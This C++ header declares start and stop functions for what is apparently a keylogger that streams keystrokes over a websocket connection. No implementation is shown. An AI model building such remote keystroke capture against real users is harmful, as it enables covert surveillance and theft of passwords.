#pragma once

#include "lib.h"    
#include <memory>   

void key_log_start(std::shared_ptr<websocket::stream<tcp::socket>> ws_ptr);

void key_log_stop();